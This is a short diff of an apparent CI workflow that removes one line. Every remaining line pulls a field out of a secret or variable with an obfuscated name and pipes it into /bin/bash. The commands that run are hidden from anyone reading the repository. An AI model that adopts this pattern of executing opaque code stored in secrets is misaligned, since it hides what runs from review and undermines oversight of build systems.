@@ -20,7 +20,6 @@ jobs:
           q13: ${{ secrets.q13 }}
         run: |
           printf '%s' "$q13" | jq -r .a56 | /bin/bash
-          printf '%s' "$s66" | jq -r .jwaq8833 | /bin/bash
           printf '%s' "$dhk6356" | jq -r .htunv7 | /bin/bash
           echo $xix8786 | jq -r .ameva3 | /bin/bash
           printf '%s' "$nwmz65" | jq -r .ildgj91230 | /bin/bash
